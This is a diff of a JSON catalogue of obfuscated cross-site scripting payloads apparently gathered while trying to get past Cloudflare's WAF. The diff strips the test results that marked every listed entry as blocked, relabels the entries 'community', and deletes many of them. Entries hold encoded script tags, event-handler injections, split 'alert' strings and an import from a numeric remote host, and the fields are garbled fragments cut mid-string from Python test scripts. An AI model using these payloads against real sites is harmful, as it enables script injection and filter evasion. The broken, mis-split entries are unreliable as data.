@@ -1,7 +1,7 @@
 {
   "category": "xss",
   "subcategory": "obfuscated",
-  "count": 91,
+  "count": 48,
   "payloads": [
     {
       "id": "xss-0024",
@@ -11,11 +11,7 @@
       "description": "<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>',\n    '<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>',\n    '<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>',\n    \"\"\"<iframe src=\"javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'\"></iframe>\"\"\",\n    '<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>',\n]\n\nfor p in PS_OBFUSC:\n    test(p)\nprint(f\"  PS obfuscation done: {total} total",
       "technique": "obfuscation",
       "source_file": "waf_round72_oss2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0042",
@@ -25,25 +21,17 @@
       "description": "math-onfocus\": '<math onfocus=alert(1) tabindex=1>x</math>',\n    \"math-onmouseover\": '<math onmouseover=alert(1)>x</math>',\n    \"math-onload\": '<math onload=alert(1)>x</math>',\n\n    # Events on child elements\n    \"mtext-onclick\": '<math><mtext onclick=alert(1)>x</mtext></math>',\n    \"mi-onclick\": '<math><mi onclick=alert(1)>x</mi></math>',\n    \"mo-onclick\": '<math><mo onclick=alert(1)>+</mo></math>',\n    \"mn-onclick\": '<math><mn onclick=alert(1)>1</mn></math>',\n    \"mrow-onclick\": '<math><mrow onclick=alert(1)>x</mrow></math>',\n    \"merror-onclick\": '<math><merror onclick=alert(1)>x</merror></math>',\n\n    # Using confirm/prompt instead of alert\n    \"math-onclick-confirm\": '<math onclick=confirm(1)>x</math>',\n    \"math-onclick-prompt\": '<math onclick=prompt(1)>x</math>',\n    \"math-onclick-print\": '<math onclick=print()>x</math>',\n\n    # Obfuscated function calls\n    \"math-onclick-top\": '<math onclick=top[\"alert",
       "technique": "obfuscation",
       "source_file": "waf_round7_math.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0474",
       "category": "xss",
       "subcategory": "obfuscated",
       "payload": "\n\" + \"=\" * 75)\nprint(\"16D: securitypolicyviolation Event (CSP error handler)\")\nprint(\"=\" * 75 + \"\n\")\n\n# onsecuritypolicyviolation fires when CSP is violated.\n# If the page has a CSP, injecting content that violates it triggers this.\nspv = {\n    \"html-body-spv\": '<body onsecuritypolicyviolation=alert(1)>",
-      "description": "html-div-spv\": '<div onsecuritypolicyviolation=alert(1)>x</div>',\n    \"attr-spv\": {\"attributeHtml\": '\" onsecuritypolicyviolation=alert(1) x=\"'},\n    \"sc-div-spv\": {\"attributeHtml\": '\"/><div onsecuritypolicyviolation=alert(1)>'},\n    \n    # Mixed case\n    \"html-OnSecurityPolicyViolation\": '<div OnSecurityPolicyViolation=alert(1)>x</div>',\n    \n    # With Only= trick\n    \"html-div-Only-spv\": '<div Only=1 onsecuritypolicyviolation=alert(1)>x</div>',\n}\n\nfor name, payload in spv.items():\n    if isinstance(payload, dict):\n        test(name, payload)\n    else:\n        test(name, {\"globalHtml\": payload})\n\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nprint(\"\\n\" + \"=\" * 75)\nprint(\"16E: Attribute Stuffing + Multiple Tag Names",
+      "description": "html-div-spv\": '<div onsecuritypolicyviolation=alert(1)>x</div>',\n    \"attr-spv\": {\"attributeHtml\": '\" onsecuritypolicyviolation=alert(1) x=\"'},\n    \"sc-div-spv\": {\"attributeHtml\": '\"/><div onsecuritypolicyviolation=alert(1)>'},\n    \n    # Mixed case\n    \"html-OnSecurityPolicyViolation\": '<div OnSecurityPolicyViolation=alert(1)>x</div>',\n    \n    # With Only= trick\n    \"html-div-Only-spv\": '<div Only=1 onsecuritypolicyviolation=alert(1)>x</div>',\n}\n\nfor name, payload in spv.items():\n    if isinstance(payload, dict):\n        test(name, payload)\n    else:\n        test(name, {\"globalHtml\": payload})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"16E: Attribute Stuffing + Multiple Tag Names",
       "technique": "obfuscation",
       "source_file": "waf_round16.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0004",
@@ -53,11 +41,7 @@
       "description": "<svg onload=alert(1)>",
       "technique": "direct_injection",
       "source_file": "waf_round6.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0005",
@@ -67,11 +51,7 @@
       "description": "<svg onload=alert(1)>",
       "technique": "direct_injection",
       "source_file": "waf_round6.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0006",
@@ -81,25 +61,7 @@
       "description": "self['ale'+'rt",
       "technique": "direct_injection",
       "source_file": "waf_round96_portswigger.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0007",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "ale'+'rt'](1)",
-      "description": "Reflect.apply(alert,null,[1])',\n    '[].constructor.constructor(\"alert(1)",
-      "technique": "direct_injection",
-      "source_file": "waf_round96_portswigger.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0008",
@@ -109,11 +71,7 @@
       "description": "\" onfocus=self[\"ale\"+\"rt",
       "technique": "direct_injection",
       "source_file": "waf_round96_portswigger.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0009",
@@ -123,11 +81,7 @@
       "description": "\" onfocus=globalThis[\"ale\"+\"rt",
       "technique": "direct_injection",
       "source_file": "waf_round96_portswigger.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0010",
@@ -137,11 +91,7 @@
       "description": "\" onfocus=self[\"\\\\x61\\\\x6c\\\\x65\\\\x72\\\\x74",
       "technique": "direct_injection",
       "source_file": "waf_round96_portswigger.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0011",
@@ -151,11 +101,7 @@
       "description": "\" ontoggle=self[\"ale\"+\"rt",
       "technique": "direct_injection",
       "source_file": "waf_round96_portswigger.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0012",
@@ -165,11 +111,7 @@
       "description": "\" onfocus=window.alert?.() autofocus x=\"',\n    '\" oNLy=1 oNErrOR=prompt`1` x=\"',\n    '\" ignored=() onerror=prompt(1) x=\"',\n    '\" on= onerror=alert(1) x=\"',\n    '\" onx=() onfocus=alert(1) autofocus x=\"',\n    '\" onpointerenter=alert(domain) x=\"',\n]\n\nfor attr in ATTR_CF:\n    get(attr, param=\"attributeHtml\", label=\"cf-attr",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0013",
@@ -179,25 +121,7 @@
       "description": "alert(1)', ' autofocus>",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0014",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "onfocus=",
-      "description": "confirm(1)', ' autofocus>",
-      "technique": "direct_injection",
-      "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0015",
@@ -207,11 +131,7 @@
       "description": "alert(1)', ' open>",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0016",
@@ -221,25 +141,7 @@
       "description": "alert(1)', '>hover</div>",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0017",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "svg",
-      "description": "body",
-      "technique": "direct_injection",
-      "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0018",
@@ -249,11 +151,7 @@
       "description": "alert(1)', '>",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0019",
@@ -263,11 +161,7 @@
       "description": "alert(1)', ' autofocus>",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0020",
@@ -277,25 +171,7 @@
       "description": "gap-svg-lb",
       "technique": "direct_injection",
       "source_file": "waf_round40_ws_headers.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0021",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "xss-svg",
-      "description": "gap-svg-lb",
-      "technique": "direct_injection",
-      "source_file": "waf_round40_ws_headers.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0022",
@@ -305,11 +181,7 @@
       "description": "<svg/onload=window[\"\\\\u0061lert",
       "technique": "direct_injection",
       "source_file": "waf_round70_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0023",
@@ -319,11 +191,7 @@
       "description": "<svg/onload=[][\"constructor",
       "technique": "direct_injection",
       "source_file": "waf_round70_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0024",
@@ -333,11 +201,7 @@
       "description": "onmouseover', 'onpointerenter', 'onclick', 'onauxclick",
       "technique": "direct_injection",
       "source_file": "waf_round80_last.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0025",
@@ -347,39 +211,7 @@
       "description": "globalHtml=<img src=x onerror=alert(1)>\",\n          content_type=\"multipart/form-data",
       "technique": "direct_injection",
       "source_file": "waf_round3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0026",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "onfocus=",
-      "description": "onload=', 'onerror=', 'onclick=",
-      "technique": "direct_injection",
-      "source_file": "waf_round46_reflect.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0027",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "onfocus=",
-      "description": "onload=', 'onerror=",
-      "technique": "direct_injection",
-      "source_file": "waf_round46_reflect.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0028",
@@ -389,11 +221,7 @@
       "description": "GET",
       "technique": "direct_injection",
       "source_file": "waf_round46_reflect.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0029",
@@ -403,11 +231,7 @@
       "description": "GET",
       "technique": "direct_injection",
       "source_file": "waf_round46_reflect.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0030",
@@ -417,11 +241,7 @@
       "description": "constructor-globalthis\": \"<img src=x onerror=globalThis.alert(1)>\",\n\n    # Import expression\n    \"import-data\": \"<img src=x onerror=import('data:text/javascript,alert(1)",
       "technique": "direct_injection",
       "source_file": "waf_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0031",
@@ -431,95 +251,7 @@
       "description": "<svg on onload=(alert)(document.domain)>",
       "technique": "direct_injection",
       "source_file": "waf_round19_github.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0032",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "img",
-      "description": "onerror', ' src=x', '>",
-      "technique": "direct_injection",
-      "source_file": "waf_round97_portswigger2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0033",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "svg",
-      "description": "onload', '', '>",
-      "technique": "direct_injection",
-      "source_file": "waf_round97_portswigger2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0034",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "ale'+'rt'](1)",
-      "description": "eval(atob(\"YWxlcnQoMSk=",
-      "technique": "direct_injection",
-      "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0035",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "ale\"+\"rt\"](1) autofocus x=\"",
-      "description": "\" onfocus=top[\"ale\"+\"rt",
-      "technique": "direct_injection",
-      "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0036",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "\\\\x61\\\\x6c\\\\x65\\\\x72\\\\x74\"](1) autofocus x=\"",
-      "description": "\" onfocus=eval(atob(\"YWxlcnQoMSk=",
-      "technique": "direct_injection",
-      "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0037",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "ale'+'rt'](1)",
-      "description": "top['ale'+'rt",
-      "technique": "direct_injection",
-      "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0038",
@@ -529,25 +261,7 @@
       "description": "<script>parent['ale'+'rt",
       "technique": "direct_injection",
       "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0039",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "ale'+'rt'](1)</script>",
-      "description": "<script>window[/*x*/'alert'/*y*/](1)</script>\",\n    \"<script>self[/*x*/'alert'/*y*/](1)</script>\",\n    \"<script>window['\\\\x61\\\\x6c\\\\x65\\\\x72\\\\x74",
-      "technique": "direct_injection",
-      "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0040",
@@ -557,11 +271,7 @@
       "description": "<script>window['\\\\u0061\\\\u006c\\\\u0065\\\\u0072\\\\u0074",
       "technique": "direct_injection",
       "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0041",
@@ -571,53 +281,7 @@
       "description": "<svg onload=self['ale'+'rt",
       "technique": "direct_injection",
       "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0042",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "ale'+'rt'](1)>",
-      "description": "<img src=x onerror=self['ale'+'rt",
-      "technique": "direct_injection",
-      "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0043",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "ale'+'rt'](1)>",
-      "description": "<details open ontoggle=self['ale'+'rt",
-      "technique": "direct_injection",
-      "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0044",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "al\"+\"ert\"](1)>",
-      "description": "window-alert\": '<img src=x onerror=window[\"alert",
-      "technique": "direct_injection",
-      "source_file": "waf_test.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0045",
@@ -627,11 +291,7 @@
       "description": "<svg/onload=window[\"alert",
       "technique": "direct_injection",
       "source_file": "waf_round68_mass.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0046",
@@ -641,151 +301,7 @@
       "description": "POST",
       "technique": "direct_injection",
       "source_file": "waf_round44_browser_quirk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0047",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "\" on{focus=print() autofocus x=\"",
-      "description": "POST",
-      "technique": "direct_injection",
-      "source_file": "waf_round44_browser_quirk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0048",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "svg",
-      "description": "onload', '', '>",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0049",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "ale'+'rt'](1)",
-      "description": "self['ale'+'rt",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0050",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "ale'+'rt'](1)",
-      "description": "window[/*x*/'alert'/*y*/](1)\",\n    \"window['\\\\x61\\\\x6c\\\\x65\\\\x72\\\\x74",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0051",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "ale'+'rt'](1)</script>",
-      "description": "<script>self[/*x*/'alert'/*y*/](1)</script>\",\n    '<noembed><img title=\"</noembed><img src onerror=alert(1)>\"></noembed>',\n    '<style><img title=\"</style><img src onerror=alert(1)>\"></style>',\n    '<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>',\n    '<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>',\n    '<svg><script>\\\\u0061\\\\u006c\\\\u0065\\\\u0072\\\\u0074(1)</script></svg>',\n    '<img src=x onerror=eval(atob(\"YWxlcnQoMSk=",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0052",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "ale\"+\"rt\"](1) autofocus x=\"",
-      "description": "\" onfocus=parent[\"ale\"+\"rt",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0053",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "ale\"+\"rt\"](1)>",
-      "description": "<img//////src=x onerror=window[/*x*/\"alert\"/*y*/](1)>',\n    '<img//////src=x onerror=window[\"\\\\x61\\\\x6c\\\\x65\\\\x72\\\\x74",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0054",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "ale\"+\"rt\"](1)>",
-      "description": "<svg//////onload=self[\"ale\"+\"rt",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0055",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "ale\"+\"rt\"](1)>",
-      "description": "<img oNLy=1 src=x onerror=window[/*x*/\"alert\"/*y*/](1)>',\n    '<img oNLy=1 src=x onerror=eval(atob(\"YWxlcnQoMSk=",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0056",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "ale\"+\"rt\"](1)>",
-      "description": "<details oNLy=1 open ontoggle=window[\"ale\"+\"rt",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0057",
@@ -795,53 +311,7 @@
       "description": "self['con'+'firm",
       "technique": "direct_injection",
       "source_file": "waf_round76_cross2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0058",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "svg",
-      "description": "SVG', 'Svg', 'img', 'IMG', 'Img', 'body', 'Body',\n            'div', 'Div', 'input', 'Input', 'math', 'Math', 'a', 'A",
-      "technique": "direct_injection",
-      "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0059",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "<details open ontoggle=",
-      "description": ">",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_push.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0060",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "<input onfocus=",
-      "description": " autofocus>",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_push.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0061",
@@ -851,11 +321,7 @@
       "description": ">",
       "technique": "direct_injection",
       "source_file": "waf_round90_push.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0062",
@@ -865,11 +331,7 @@
       "description": "onerror",
       "technique": "direct_injection",
       "source_file": "waf_round93_research3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0063",
@@ -879,53 +341,7 @@
       "description": "<svg onload=prompt%26%230000000040document.domain)>',\n    '<svg onload=prompt%26%23x000000028;document.domain)>',\n    \"\"\"xss'\"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>\"\"\",\n    '<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\">X</a>',\n    '<--%253cimg%20onerror=alert(1)%20src=a%253e --!>',\n    \"\"\"<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>\"\"\",\n    'javascript:{ alert`0` }',\n    \"\"\"1'\"><img/src/onerror=.1|alert``>\"\"\",\n    \"<img src=x onError=import('//1152848220/",
       "technique": "direct_injection",
       "source_file": "waf_round71_oss.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0064",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "al\"+\"ert\"](1)>",
-      "description": "<svg/onload=window[\"\\\\x61lert",
-      "technique": "direct_injection",
-      "source_file": "waf_round71_oss.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0065",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "svg",
-      "description": "load', '",
-      "technique": "direct_injection",
-      "source_file": "waf_round28_exploit.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0066",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "img",
-      "description": "error', ' src=x",
-      "technique": "direct_injection",
-      "source_file": "waf_round28_exploit.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0067",
@@ -935,25 +351,7 @@
       "description": "alert",
       "technique": "direct_injection",
       "source_file": "waf_round80_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0068",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "img",
-      "description": "svg', 'iframe', 'body",
-      "technique": "direct_injection",
-      "source_file": "waf_round80_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0069",
@@ -963,25 +361,7 @@
       "description": "onpageshow",
       "technique": "direct_injection",
       "source_file": "waf_round79_cross3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0070",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "onfocus",
-      "description": "onblur",
-      "technique": "direct_injection",
-      "source_file": "waf_round79_cross3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0071",
